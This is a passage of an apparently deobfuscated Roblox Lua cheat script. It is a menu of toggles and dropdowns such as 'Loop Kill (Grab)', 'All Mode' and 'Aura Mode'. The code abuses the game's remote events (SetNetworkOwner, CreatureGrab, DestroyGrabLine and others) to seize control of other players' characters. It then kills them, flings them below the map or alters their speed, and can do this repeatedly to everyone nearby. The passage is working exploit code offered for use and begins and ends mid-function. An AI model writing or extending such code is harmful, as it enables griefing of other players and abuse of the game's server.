                                    end
                                end
                            end

                            task.wait(0.1)
                        end
                    end)
                else
                    if tbl2.PenKillTask then
                        task.cancel(tbl2.PenKillTask)
                        tbl2.PenKillTask = nil
                    end

                    if tbl2.PenKillRespawnConn then
                        tbl2.PenKillRespawnConn:Disconnect()
                        tbl2.PenKillRespawnConn = nil
                    end

                    local v46 = obj.Workspace:FindFirstChild(localPlayer.Name .. "SpawnedInToys")

                    if v46 then
                        local menuToys2 = obj.ReplicatedStorage:FindFirstChild("MenuToys")
                        local destroyToy2 = menuToys2 and obj.ReplicatedStorage.MenuToys:FindFirstChild("DestroyToy")

                        if destroyToy2 then
                            for k, child in pairs(v46:GetChildren()) do
                                if child.Name == "ToolPencil" then
                                    pcall(function()
                                        destroyToy2:FireServer(child)
                                    end)
                                end
                            end
                        end
                    end
                end
            end,
        })

        Grab:AddToggle("LoopKill", {
            Text = "Loop Kill (Grab)",
            Default = false,
            Callback = function(loopKillToggle)
                tbl2.LoopKillToggle = loopKillToggle

                if loopKillToggle then
                    if not tbl2.PlayerList or #tbl2.PlayerList == 0 then
                        task.spawn(function()
                            toggles.LoopKill:SetValue(false)
                        end)

                        return
                    end

                    if tbl2.LoopKillTask then
                        task.cancel(tbl2.LoopKillTask)
                    end

                    tbl2.LoopKillTask = task.spawn(function()
                        while tbl2.LoopKillToggle do
                            if localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart") then
                                local humanoidRootPart = localPlayer.Character.HumanoidRootPart

                                if humanoidRootPart.CFrame.Position.Y > -50 then
                                    LoopKillSavedCFrame = humanoidRootPart.CFrame
                                end
                            end

                            if tbl2.PlayerList then
                                local v46, v47, v48 = ipairs(tbl2.PlayerList)
                                local v49 = v48
                                local v50 = v46
                                local v51 = v47

                                while true do
                                    local v52, v53 = v50(v51, v49)
                                    if v52 == nil then
                                        break
                                    end
                                    v49 = v52
                                    if not tbl2.LoopKillToggle then
                                        break
                                    end
                                    local v54 = obj.Players:FindFirstChild(v53)

                                    if v54 and v54.Parent and v54.Character and v54.Character:FindFirstChild("Humanoid") and v54.Character.Humanoid.Health > 0 then
                                        local character = v54.Character
                                        local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
                                        local head_ = character:FindFirstChild("Head")
                                        local humanoid = character:FindFirstChildOfClass("Humanoid")

                                        if humanoidRootPart and head_ and humanoid then
                                            local flag = false

                                            task.spawn(function()
                                                for i = 1, 30 do
                                                    pcall(function()
                                                        if Struggle then
                                                            Struggle:FireServer(character)
                                                        end

                                                        if RagdollRemote then
                                                            RagdollRemote:FireServer(humanoidRootPart, 0)
                                                        end

                                                        if StopAllVelocity then
                                                            obj.ReplicatedStorage.GameCorrectionEvents.StopAllVelocity:FireServer()
                                                        end

                                                        if DestroyGrabLine then
                                                            task.delay(0.03, function()
                                                                pcall(function()
                                                                    DestroyGrabLine:FireServer(humanoidRootPart)
                                                                end)
                                                            end)

                                                            task.delay(0.05, function()
                                                                pcall(function()
                                                                    DestroyGrabLine:FireServer(humanoidRootPart)
                                                                end)
                                                            end)
                                                        end

                                                        if SetNetworkOwner and localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart") then
                                                            local humanoidRootPart2 = localPlayer.Character.HumanoidRootPart

                                                            if localPlayer:DistanceFromCharacter(humanoidRootPart.Position) <= 30 then
                                                                local unit = (humanoidRootPart.Position - humanoidRootPart2.Position).Unit
                                                                local v55 = unit:Cross(Vector3.new(0, 1, 0))
                                                                local v56 = v55:Cross(unit)
                                                                SetNetworkOwner:FireServer(humanoidRootPart, CFrame.fromMatrix(humanoidRootPart2.Position, v55, v56))
                                                            end
                                                        end
                                                    end)

                                                    task.wait()
                                                end
                                            end)

                                            pcall(function()
                                                local truePositionPart = character:FindFirstChild("TruePositionPart")

                                                if truePositionPart then
                                                    truePositionPart:Destroy()
                                                end

                                                local rootAttachment = humanoidRootPart:FindFirstChild("RootAttachment")

                                                if rootAttachment then
                                                    rootAttachment.Parent = humanoidRootPart
                                                end
                                            end)

                                            local v55 = v50
                                            local v56 = v51

                                            for i = 1, 50 do
                                                if not tbl2.LoopKillToggle or not v54.Parent or not v54.Character or not v54.Character:FindFirstChild("Humanoid") or v54.Character.Humanoid.Health <= 0 then
                                                    break
                                                end

                                                pcall(function()
                                                    if SetNetworkOwner and localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart") then
                                                        local humanoidRootPart2 = localPlayer.Character.HumanoidRootPart

                                                        if localPlayer:DistanceFromCharacter(humanoidRootPart.Position) <= 30 then
                                                            local unit = (humanoidRootPart.Position - humanoidRootPart2.Position).Unit
                                                            local v57 = unit:Cross(Vector3.new(0, 1, 0))
                                                            local v58 = v57:Cross(unit)
                                                            SetNetworkOwner:FireServer(humanoidRootPart, CFrame.fromMatrix(humanoidRootPart2.Position, v57, v58))
                                                        end
                                                    end
                                                end)

                                                pcall(function()
                                                    local truePositionPart = character:FindFirstChild("TruePositionPart")

                                                    if truePositionPart then
                                                        truePositionPart:Destroy()
                                                    end

                                                    local rootAttachment = humanoidRootPart:FindFirstChild("RootAttachment")

                                                    if rootAttachment then
                                                        rootAttachment.Parent = humanoidRootPart
                                                    end
                                                end)

                                                if DestroyGrabLine then
                                                    task.delay(0.03, function()
                                                        pcall(function()
                                                            DestroyGrabLine:FireServer(humanoidRootPart)
                                                        end)
                                                    end)
                                                end

                                                pcall(function()
                                                    humanoidRootPart.AssemblyLinearVelocity = Vector3.zero
                                                    humanoidRootPart.AssemblyAngularVelocity = Vector3.zero
                                                    humanoidRootPart.Anchored = false
                                                end)

                                                pcall(function()
                                                    local partOwner_ = head_:FindFirstChild("PartOwner")

                                                    if partOwner_ then
                                                        partOwner_.Value = localPlayer.Name
                                                    end
                                                end)

                                                local flag2 = false

                                                if head_:FindFirstChild("PartOwner") and head_.PartOwner.Value == localPlayer.Name then
                                                    flag2 = true
                                                end

                                                if not flag2 and humanoidRootPart.AssemblyLinearVelocity.Magnitude <= 500 then
                                                    task.wait()

                                                    if localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart") then
                                                        local humanoidRootPart2 = localPlayer.Character.HumanoidRootPart

                                                        if humanoidRootPart.Position.Y <= -12 then
                                                            if LoopKillSavedCFrame then
                                                                humanoidRootPart2.CFrame = LoopKillSavedCFrame
                                                            end
                                                        else
                                                            humanoidRootPart2.CFrame = CFrame.new(humanoidRootPart.Position + Vector3.new(0, -10, -10))
                                                        end
                                                    end

                                                    humanoid.BreakJointsOnDeath = false
                                                    humanoid:ChangeState(Enum.HumanoidStateType.Dead)
                                                    humanoid.Jump = true
                                                    humanoid.Sit = false
                                                    continue
                                                end

                                                flag = true
                                                break
                                            end

                                            v49 = v52
                                            v50 = v55
                                            v51 = v56

                                            if flag and tbl2.LoopKillToggle and v54.Parent and v54.Character and v54.Character:FindFirstChild("Humanoid") and v54.Character.Humanoid.Health > 0 then
                                                if LoopKillSavedCFrame and localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart") then
                                                    localPlayer.Character.HumanoidRootPart.CFrame = LoopKillSavedCFrame
                                                end

                                                for i = 1, 25 do
                                                    pcall(function()
                                                        humanoidRootPart.Anchored = false
                                                        humanoidRootPart.CFrame = CFrame.new(humanoidRootPart.Position.X, -400, humanoidRootPart.Position.Z)
                                                        humanoidRootPart.AssemblyLinearVelocity = Vector3.new(0, -3000, 0)

                                                        for k, child in pairs(character:GetChildren()) do
                                                            if child:IsA("BasePart") then
                                                                child.CanCollide = false
                                                            end
                                                        end
                                                    end)

                                                    if DestroyGrabLine then
                                                        task.delay(0.03, function()
                                                            pcall(function()
                                                                DestroyGrabLine:FireServer(humanoidRootPart)
                                                            end)
                                                        end)

                                                        task.delay(0.03, function()
                                                            pcall(function()
                                                                DestroyGrabLine:FireServer(humanoidRootPart)
                                                            end)
                                                        end)
                                                    end

                                                    task.wait()
                                                end

                                                pcall(function()
                                                    local truePositionPart = character:FindFirstChild("TruePositionPart")

                                                    if truePositionPart then
                                                        truePositionPart:Destroy()
                                                    end

                                                    local rootAttachment = humanoidRootPart:FindFirstChild("RootAttachment")

                                                    if rootAttachment then
                                                        rootAttachment.Parent = humanoidRootPart
                                                    end
                                                end)

                                                for i = 1, 40 do
                                                    pcall(function()
                                                        humanoidRootPart.Anchored = false
                                                        humanoidRootPart.CFrame = CFrame.new(humanoidRootPart.Position.X, -1000000, humanoidRootPart.Position.Z)
                                                        humanoidRootPart.AssemblyLinearVelocity = Vector3.new(0, -1000000, 0)

                                                        for k, child in pairs(character:GetChildren()) do
                                                            if child:IsA("BasePart") then
                                                                child.CanCollide = false
                                                            end
                                                        end
                                                    end)

                                                    if DestroyGrabLine then
                                                        task.delay(0.03, function()
                                                            pcall(function()
                                                                DestroyGrabLine:FireServer(humanoidRootPart)
                                                            end)
                                                        end)

                                                        task.delay(0.03, function()
                                                            pcall(function()
                                                                DestroyGrabLine:FireServer(humanoidRootPart)
                                                            end)
                                                        end)
                                                    end

                                                    task.wait()
                                                end

                                                v49 = v52
                                                v50 = v55
                                                v51 = v56

                                                pcall(function()
                                                    for k, child in pairs(character:GetChildren()) do
                                                        if child:IsA("BasePart") then
                                                            child.CanCollide = true
                                                        end
                                                    end

                                                    if humanoidRootPart:FindFirstChild("SkyVelocity") then
                                                        humanoidRootPart.SkyVelocity:Destroy()
                                                    end
                                                end)
                                            end
                                        end
                                    end
                                end
                            end

                            if LoopKillSavedCFrame and localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart") then
                                localPlayer.Character.HumanoidRootPart.CFrame = LoopKillSavedCFrame
                            end

                            task.wait(0.1)
                        end

                        if tbl2.PlayerList then
                            for i, v46 in ipairs(tbl2.PlayerList) do
                                local v47 = obj.Players:FindFirstChild(v46)

                                if v47 and v47.Character and v47.Character:FindFirstChild("HumanoidRootPart") and DestroyGrabLine then
                                    local humanoidRootPart = v47.Character.HumanoidRootPart

                                    task.delay(0.05, function()
                                        pcall(function()
                                            DestroyGrabLine:FireServer(humanoidRootPart)
                                        end)
                                    end)
                                end
                            end
                        end

                        if LoopKillSavedCFrame and localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart") then
                            localPlayer.Character.HumanoidRootPart.CFrame = LoopKillSavedCFrame
                        end
                    end)
                else
                    if tbl2.LoopKillTask then
                        task.cancel(tbl2.LoopKillTask)
                        tbl2.LoopKillTask = nil
                    end

                    if tbl2.PlayerList then
                        for i, v46 in ipairs(tbl2.PlayerList) do
                            local v47 = obj.Players:FindFirstChild(v46)

                            if v47 and v47.Character and v47.Character:FindFirstChild("HumanoidRootPart") and DestroyGrabLine then
                                local humanoidRootPart = v47.Character.HumanoidRootPart

                                task.delay(0.05, function()
                                    pcall(function()
                                        DestroyGrabLine:FireServer(humanoidRootPart)
                                    end)
                                end)
                            end
                        end
                    end

                    if LoopKillSavedCFrame and localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart") then
                        localPlayer.Character.HumanoidRootPart.CFrame = LoopKillSavedCFrame
                    end
                end
            end,
        })

        v20:AddToggle("Whiteblob", {
            Text = "whitelist",
            Default = false,
            Callback = function(bloballWhite)
                tbl2.bloballWhite = bloballWhite
            end,
        })

        v20:AddDropdown("allmode", {
            Text = "All Mode",
            Default = "Kill",
            Values = {"Kill", "Destroy Gucci", "Speed/Jump (Control)"},
            Callback = function(bloballmode)
                tbl2.Bloballmode = bloballmode
                blobmanAllMode = bloballmode

                if tbl2.blobAllT then
                    tbl2.bloballrun = false
                    task.wait(0.1)
                    tbl2.bloballrun = true
                    local v46 = blobmanAllMode

                    task.spawn(function()
                        local flag, v47, v48, v49, blobmanSeatAndOwnerScript, leftDetector, leftWeld, creatureGrab, creatureRelease, creatureDrop, v50, v51, v52, v53, v54, v55, character, humanoidRootPart, humanoid, n2
                        n2 = 1

                        while true do
                            if n2 == 1 then
                                flag = false
                                n2 = 2
                            elseif n2 == 2 then
                                if tbl2.bloballrun then
                                    n2 = 3
                                else
                                    n2 = 23
                                end
                            elseif n2 == 3 then
                                task.wait(0.01)
                                v48, v47 = charrrrrr()

                                if v47 then
                                    n2 = 4
                                else
                                    n2 = 2
                                end
                            elseif n2 == 4 then
                                v49 = fn23()

                                if v49 then
                                    n2 = 5
                                else
                                    n2 = 2
                                end
                            elseif n2 == 5 then
                                fn24(v49)
                                blobmanSeatAndOwnerScript = v49:FindFirstChild("BlobmanSeatAndOwnerScript")
                                leftDetector = v49:FindFirstChild("LeftDetector")
                                leftWeld = leftDetector

                                if leftDetector then
                                    n2 = 6
                                else
                                    n2 = 7
                                end
                            elseif n2 == 6 then
                                leftWeld = leftDetector:FindFirstChild("LeftWeld")
                                n2 = 7
                            elseif n2 == 7 then
                                if blobmanSeatAndOwnerScript and leftDetector and leftWeld then
                                    n2 = 8
                                else
                                    n2 = 2
                                end
                            elseif n2 == 8 then
                                creatureGrab = blobmanSeatAndOwnerScript:FindFirstChild("CreatureGrab")
                                creatureRelease = blobmanSeatAndOwnerScript:FindFirstChild("CreatureRelease")
                                creatureDrop = blobmanSeatAndOwnerScript:FindFirstChild("CreatureDrop")

                                if creatureGrab and creatureRelease and creatureDrop then
                                    n2 = 9
                                else
                                    n2 = 2
                                end
                            elseif n2 == 9 then
                                if v46 ~= "Kill" and v46 ~= "Destroy Gucci" then
                                    n2 = 13
                                else
                                    n2 = 10
                                end
                            elseif n2 == 10 then
                                if flag then
                                    n2 = 11
                                else
                                    n2 = 12
                                end
                            elseif n2 == 11 then
                                flag = false
                                n2 = 13
                            elseif n2 == 12 then
                                flag = true
                                n2 = 13
                            elseif n2 == 13 then
                                v50, v51, v52 = ipairs(obj.Players:GetPlayers())
                                v53 = v52
                                n2 = 14
                            elseif n2 == 14 then
                                v54, v55 = v50(v51, v53)

                                if v54 == nil then
                                    n2 = 2
                                else
                                    n2 = 15
                                end
                            elseif n2 == 15 then
                                v53 = v54

                                if tbl2.bloballrun then
                                    n2 = 16
                                else
                                    n2 = 2
                                end
                            elseif n2 == 16 then
                                if v55 ~= localPlayer and not fn12(v55) then
                                    n2 = 17
                                else
                                    n2 = 14
                                end
                            elseif n2 == 17 then
                                character = v55.Character
                                humanoidRootPart = character

                                if character then
                                    n2 = 18
                                else
                                    n2 = 19
                                end
                            elseif n2 == 18 then
                                humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
                                n2 = 19
                            elseif n2 == 19 then
                                humanoid = character

                                if character then
                                    n2 = 20
                                else
                                    n2 = 21
                                end
                            elseif n2 == 20 then
                                humanoid = character:FindFirstChildOfClass("Humanoid")
                                n2 = 21
                            elseif n2 == 21 then
                                if humanoidRootPart and humanoid and (v47.Position - humanoidRootPart.Position).Magnitude <= 30 then
                                    n2 = 22
                                else
                                    n2 = 14
                                end
                            elseif n2 == 22 then
                                pcall(function()
                                    creatureGrab:FireServer(leftDetector, humanoidRootPart, leftWeld)
                                    creatureRelease:FireServer(leftWeld, humanoidRootPart)
                                    creatureDrop:FireServer(leftWeld, humanoidRootPart)

                                    if v46 == "Kill" then
                                        local v56 = flag
                                        local health = v56 and 0 or 100
                                        humanoid.Health = health
                                    elseif v46 == "Speed/Jump (Control)" then
                                        humanoid.WalkSpeed = tbl2.WalkspeedCont
                                        humanoid.JumpPower = tbl2.JumpPownerCont
                                    end
                                end)

                                n2 = 14
                            elseif n2 == 23 then
                                return
                            end
                        end
                    end)

                    local n2 = v46 == "Speed/Jump (Control)" and 2 or 1

                    for i = 1, n2 do
                        task.spawn(function()
                            local v47, v48, v49, v50, v51, v52, v53, v54, v55, character, humanoidRootPart, n3
                            n3 = 1

                            while true do
                                if n3 == 1 then
                                    if tbl2.bloballrun then
                                        n3 = 2
                                    else
                                        n3 = 12
                                    end
                                elseif n3 == 2 then
                                    task.wait(0.1)
                                    v48, v47 = charrrrrr()

                                    if v47 then
                                        n3 = 3
                                    else
                                        n3 = 1
                                    end
                                elseif n3 == 3 then
                                    v49 = fn23()

                                    if v49 then
                                        n3 = 4
                                    else
                                        n3 = 1
                                    end
                                elseif n3 == 4 then
                                    fn24(v49)
                                    v50, v51, v52 = ipairs(obj.Players:GetPlayers())
                                    v53 = v52
                                    n3 = 5
                                elseif n3 == 5 then
                                    v54, v55 = v50(v51, v53)

                                    if v54 == nil then
                                        n3 = 1
                                    else
                                        n3 = 6
                                    end
                                elseif n3 == 6 then
                                    v53 = v54

                                    if tbl2.bloballrun then
                                        n3 = 7
                                    else
                                        n3 = 1
                                    end
                                elseif n3 == 7 then
                                    if v55 ~= localPlayer and not fn12(v55) then
                                        n3 = 8
                                    else
                                        n3 = 5
                                    end
                                elseif n3 == 8 then
                                    character = v55.Character
                                    humanoidRootPart = character

                                    if character then
                                        n3 = 9
                                    else
                                        n3 = 10
                                    end
                                elseif n3 == 9 then
                                    humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
                                    n3 = 10
                                elseif n3 == 10 then
                                    if humanoidRootPart then
                                        n3 = 11
                                    else
                                        n3 = 5
                                    end
                                elseif n3 == 11 then
                                    pcall(function()
                                        v47.CFrame = humanoidRootPart.CFrame * CFrame.new(0, 0, -3)
                                    end)

                                    task.wait(0.2)
                                    n3 = 5
                                elseif n3 == 12 then
                                    return
                                end
                            end
                        end)
                    end
                end
            end,
        })

        v20:AddToggle("All", {
            Text = "All",
            Default = false,
            Callback = function(blobAllT)
                tbl2.blobAllT = blobAllT
                tbl2.blobAllT = blobAllT
                tbl2.bloballrun = blobAllT
                if not blobAllT then
                    return
                end
                local v46 = blobmanAllMode
                local bloballmode = v46 or tbl2.Bloballmode or "Kill"

                task.spawn(function()
                    local flag, v47, v48, v49, blobmanSeatAndOwnerScript, leftDetector, leftWeld, creatureGrab, creatureRelease, creatureDrop, v50, v51, v52, v53, v54, v55, character, humanoidRootPart, humanoid, n2
                    n2 = 1

                    while true do
                        if n2 == 1 then
                            flag = false
                            n2 = 2
                        elseif n2 == 2 then
                            if tbl2.bloballrun then
                                n2 = 3
                            else
                                n2 = 23
                            end
                        elseif n2 == 3 then
                            task.wait(0.01)
                            v48, v47 = charrrrrr()

                            if v47 then
                                n2 = 4
                            else
                                n2 = 2
                            end
                        elseif n2 == 4 then
                            v49 = fn23()

                            if v49 then
                                n2 = 5
                            else
                                n2 = 2
                            end
                        elseif n2 == 5 then
                            fn24(v49)
                            blobmanSeatAndOwnerScript = v49:FindFirstChild("BlobmanSeatAndOwnerScript")
                            leftDetector = v49:FindFirstChild("LeftDetector")
                            leftWeld = leftDetector

                            if leftDetector then
                                n2 = 6
                            else
                                n2 = 7
                            end
                        elseif n2 == 6 then
                            leftWeld = leftDetector:FindFirstChild("LeftWeld")
                            n2 = 7
                        elseif n2 == 7 then
                            if blobmanSeatAndOwnerScript and leftDetector and leftWeld then
                                n2 = 8
                            else
                                n2 = 2
                            end
                        elseif n2 == 8 then
                            creatureGrab = blobmanSeatAndOwnerScript:FindFirstChild("CreatureGrab")
                            creatureRelease = blobmanSeatAndOwnerScript:FindFirstChild("CreatureRelease")
                            creatureDrop = blobmanSeatAndOwnerScript:FindFirstChild("CreatureDrop")

                            if creatureGrab and creatureRelease and creatureDrop then
                                n2 = 9
                            else
                                n2 = 2
                            end
                        elseif n2 == 9 then
                            if bloballmode ~= "Kill" and bloballmode ~= "Destroy Gucci" then
                                n2 = 13
                            else
                                n2 = 10
                            end
                        elseif n2 == 10 then
                            if flag then
                                n2 = 11
                            else
                                n2 = 12
                            end
                        elseif n2 == 11 then
                            flag = false
                            n2 = 13
                        elseif n2 == 12 then
                            flag = true
                            n2 = 13
                        elseif n2 == 13 then
                            v50, v51, v52 = ipairs(obj.Players:GetPlayers())
                            v53 = v52
                            n2 = 14
                        elseif n2 == 14 then
                            v54, v55 = v50(v51, v53)

                            if v54 == nil then
                                n2 = 2
                            else
                                n2 = 15
                            end
                        elseif n2 == 15 then
                            v53 = v54

                            if tbl2.bloballrun then
                                n2 = 16
                            else
                                n2 = 2
                            end
                        elseif n2 == 16 then
                            if v55 ~= localPlayer and not fn12(v55) then
                                n2 = 17
                            else
                                n2 = 14
                            end
                        elseif n2 == 17 then
                            character = v55.Character
                            humanoidRootPart = character

                            if character then
                                n2 = 18
                            else
                                n2 = 19
                            end
                        elseif n2 == 18 then
                            humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
                            n2 = 19
                        elseif n2 == 19 then
                            humanoid = character

                            if character then
                                n2 = 20
                            else
                                n2 = 21
                            end
                        elseif n2 == 20 then
                            humanoid = character:FindFirstChildOfClass("Humanoid")
                            n2 = 21
                        elseif n2 == 21 then
                            if humanoidRootPart and humanoid and (v47.Position - humanoidRootPart.Position).Magnitude <= 30 then
                                n2 = 22
                            else
                                n2 = 14
                            end
                        elseif n2 == 22 then
                            pcall(function()
                                creatureGrab:FireServer(leftDetector, humanoidRootPart, leftWeld)
                                creatureRelease:FireServer(leftWeld, humanoidRootPart)
                                creatureDrop:FireServer(leftWeld, humanoidRootPart)

                                if bloballmode == "Kill" then
                                    local v56 = flag
                                    local health = v56 and 0 or 100
                                    humanoid.Health = health
                                elseif bloballmode == "Speed/Jump (Control)" then
                                    humanoid.WalkSpeed = tbl2.WalkspeedCont
                                    humanoid.JumpPower = tbl2.JumpPownerCont
                                end
                            end)

                            n2 = 14
                        elseif n2 == 23 then
                            return
                        end
                    end
                end)

                local n2 = bloballmode == "Speed/Jump (Control)" and 2 or 1

                for i = 1, n2 do
                    task.spawn(function()
                        local v47, v48, v49, v50, v51, v52, v53, v54, v55, character, humanoidRootPart, n3
                        n3 = 1

                        while true do
                            if n3 == 1 then
                                if tbl2.bloballrun then
                                    n3 = 2
                                else
                                    n3 = 12
                                end
                            elseif n3 == 2 then
                                task.wait(0.1)
                                v48, v47 = charrrrrr()

                                if v47 then
                                    n3 = 3
                                else
                                    n3 = 1
                                end
                            elseif n3 == 3 then
                                v49 = fn23()

                                if v49 then
                                    n3 = 4
                                else
                                    n3 = 1
                                end
                            elseif n3 == 4 then
                                fn24(v49)
                                v50, v51, v52 = ipairs(obj.Players:GetPlayers())
                                v53 = v52
                                n3 = 5
                            elseif n3 == 5 then
                                v54, v55 = v50(v51, v53)

                                if v54 == nil then
                                    n3 = 1
                                else
                                    n3 = 6
                                end
                            elseif n3 == 6 then
                                v53 = v54

                                if tbl2.bloballrun then
                                    n3 = 7
                                else
                                    n3 = 1
                                end
                            elseif n3 == 7 then
                                if v55 ~= localPlayer and not fn12(v55) then
                                    n3 = 8
                                else
                                    n3 = 5
                                end
                            elseif n3 == 8 then
                                character = v55.Character
                                humanoidRootPart = character

                                if character then
                                    n3 = 9
                                else
                                    n3 = 10
                                end
                            elseif n3 == 9 then
                                humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
                                n3 = 10
                            elseif n3 == 10 then
                                if humanoidRootPart then
                                    n3 = 11
                                else
                                    n3 = 5
                                end
                            elseif n3 == 11 then
                                pcall(function()
                                    v47.CFrame = humanoidRootPart.CFrame * CFrame.new(0, 0, -3)
                                end)

                                task.wait(0.2)
                                n3 = 5
                            elseif n3 == 12 then
                                return
                            end
                        end
                    end)
                end
            end,
        })

        v21:AddToggle("WhiteBLob", {
            Text = "Whitelist",
            Default = true,
            Callback = function(whitelistFriendsBLOB)
                tbl2.WhitelistFriendsBLOB = whitelistFriendsBLOB
            end,
        })

        v21:AddDropdown("Auramoded", {
            Text = "Aura Mode",
            Values = {
                "Kill",
                "Destroy Gucci",
                "Speed/Jump (Control)",
                "Kill (Beach)",
                "Grab Aura",
            },
            Default = "Kill",
            Callback = function(blobauraM)
                tbl2.BlobauraM = blobauraM

                if tbl2.BlobauraT then
                    tbl2.BlobauraR = false
                    task.wait(0.1)
                    tbl2.BlobauraR = tbl2.BlobauraT

                    if tbl2.BlobauraT then
                        local blobauraM2 = tbl2.BlobauraM

                        if blobauraM2 == "Kill" or blobauraM2 == "Destroy Gucci" or blobauraM2 == "Speed/Jump (Control)" or blobauraM2 == "Kill (Beach)" or blobauraM2 == "Grab Aura" then
                            task.spawn(function()
                                local fn40, flag, v46, v47, v48, blobmanSeatAndOwnerScript, leftDetector, leftWeld, creatureGrab, creatureRelease, creatureDrop, v49, v50, v51, v52, v53, v54, character, humanoidRootPart, humanoid
                                local v55, flag2, flag3, flag4, v56, v57, v58, v59, v60, v61, v62, v63, playerFromCharacter, n2
                                n2 = 1

                                while true do
                                    if n2 == 1 then
                                        fn40 = function()
                                            return tbl2.BlobauraR
                                        end

                                        flag = false
                                        n2 = 2
                                    elseif n2 == 2 then
                                        if fn40() then
                                            n2 = 3
                                        else
                                            n2 = 45
                                        end
                                    elseif n2 == 3 then
                                        task.wait(0.01)

                                        if blobauraM2 == "Grab Aura" then
                                            n2 = 38
                                        else
                                            n2 = 4
                                        end
                                    elseif n2 == 4 then
                                        v47, v46 = charrrrrr()

                                        if v46 then
                                            n2 = 5
                                        else
                                            n2 = 2
                                        end
                                    elseif n2 == 5 then
                                        v48 = fn23()

                                        if v48 then
                                            n2 = 6
                                        else
                                            n2 = 2
                                        end
                                    elseif n2 == 6 then
                                        fn24(v48)
                                        blobmanSeatAndOwnerScript = v48:FindFirstChild("BlobmanSeatAndOwnerScript")
                                        leftDetector = v48:FindFirstChild("LeftDetector")
                                        leftWeld = leftDetector

                                        if leftDetector then
                                            n2 = 7
                                        else
                                            n2 = 8
                                        end
                                    elseif n2 == 7 then
                                        leftWeld = leftDetector:FindFirstChild("LeftWeld")
                                        n2 = 8
                                    elseif n2 == 8 then
                                        if blobmanSeatAndOwnerScript and leftDetector and leftWeld then
                                            n2 = 9
                                        else
                                            n2 = 2
                                        end
                                    elseif n2 == 9 then
                                        creatureGrab = blobmanSeatAndOwnerScript:FindFirstChild("CreatureGrab")
                                        creatureRelease = blobmanSeatAndOwnerScript:FindFirstChild("CreatureRelease")
                                        creatureDrop = blobmanSeatAndOwnerScript:FindFirstChild("CreatureDrop")

                                        if creatureGrab and creatureRelease and creatureDrop then
                                            n2 = 10
                                        else
                                            n2 = 2
                                        end
                                    elseif n2 == 10 then
                                        if flag then
                                            n2 = 11
                                        else
                                            n2 = 12
                                        end
                                    elseif n2 == 11 then
                                        flag = false
                                        n2 = 13
                                    elseif n2 == 12 then
                                        flag = true
                                        n2 = 13
                                    elseif n2 == 13 then
                                        v49, v50, v51 = ipairs(obj.Players:GetPlayers())
                                        v52 = v51
                                        n2 = 14
                                    elseif n2 == 14 then
                                        v53, v54 = v49(v50, v52)

                                        if v53 == nil then
                                            n2 = 2
                                        else
                                            n2 = 15
                                        end
                                    elseif n2 == 15 then
                                        v52 = v53

                                        if fn40() then
                                            n2 = 16
                                        else
                                            n2 = 2
                                        end
                                    elseif n2 == 16 then
                                        if v54 ~= localPlayer and not fn13(v54) then
                                            n2 = 17
                                        else
                                            n2 = 14
                                        end
                                    elseif n2 == 17 then
                                        character = v54.Character
                                        humanoidRootPart = character

                                        if character then
                                            n2 = 18
                                        else
                                            n2 = 19
                                        end
                                    elseif n2 == 18 then
                                        humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
                                        n2 = 19
                                    elseif n2 == 19 then
                                        humanoid = character

                                        if character then
                                            n2 = 20
                                        else
                                            n2 = 21
                                        end
                                    elseif n2 == 20 then
                                        humanoid = character:FindFirstChildOfClass("Humanoid")
                                        n2 = 21
                                    elseif n2 == 21 then
                                        if blobauraM2 == "Kill (Beach)" then
                                            n2 = 30
                                        else
                                            n2 = 22
                                        end
                                    elseif n2 == 22 then
                                        v55 = humanoidRootPart

                                        if humanoidRootPart then
                                            n2 = 23
                                        else
                                            n2 = 24
                                        end
                                    elseif n2 == 23 then
                                        v55 = humanoid
                                        n2 = 24
                                    elseif n2 == 24 then
                                        if v55 then
                                            n2 = 25
                                        else
                                            n2 = 26
                                        end
                                    elseif n2 == 25 then
                                        flag2 = false
                                        n2 = 27
                                    elseif n2 == 26 then
                                        flag2 = true
                                        n2 = 27
                                    elseif n2 == 27 then
                                        if flag2 then
                                            n2 = 28
                                        else
                                            n2 = 29
                                        end
                                    elseif n2 == 28 then
                                        flag3 = false
                                        n2 = 36
                                    elseif n2 == 29 then
                                        flag3 = true
                                        n2 = 36
                                    elseif n2 == 30 then
                                        if humanoidRootPart then
                                            n2 = 31
                                        else
                                            n2 = 32
                                        end
                                    elseif n2 == 31 then
                                        flag4 = false
                                        n2 = 33
                                    elseif n2 == 32 then
                                        flag4 = true
                                        n2 = 33
                                    elseif n2 == 33 then
                                        if flag4 then
                                            n2 = 34
                                        else
                                            n2 = 35
                                        end
                                    elseif n2 == 34 then
                                        flag3 = false
                                        n2 = 36
                                    elseif n2 == 35 then
                                        flag3 = true
                                        n2 = 36
                                    elseif n2 == 36 then
                                        if flag3 and (v46.Position - humanoidRootPart.Position).Magnitude <= 30 then
                                            n2 = 37
                                        else
                                            n2 = 14
                                        end
                                    elseif n2 == 37 then
                                        pcall(function()
                                            creatureGrab:FireServer(leftDetector, humanoidRootPart, leftWeld)
                                            creatureRelease:FireServer(leftWeld, humanoidRootPart)
                                            creatureDrop:FireServer(leftWeld, humanoidRootPart)

                                            if blobauraM2 == "Kill" then
                                                local v64 = flag
                                                local health = v64 and 0 or 100
                                                humanoid.Health = health
                                            elseif blobauraM2 ~= "Destroy Gucci" then
                                                if blobauraM2 == "Speed/Jump (Control)" then
                                                    humanoid.WalkSpeed = tbl2.WalkspeedCont
                                                    humanoid.JumpPower = tbl2.JumpPownerCont
                                                elseif blobauraM2 == "Kill (Beach)" then
                                                    humanoidRootPart.CFrame = CFrame.new(-1150, 23, -28)
                                                end
                                            end
                                        end)

                                        n2 = 14
                                    elseif n2 == 38 then
                                        v56 = getCharacter()
                                        v57 = hrp_()

                                        if v56 and v57 then
                                            n2 = 39
                                        else
                                            n2 = 2
                                        end
                                    elseif n2 == 39 then
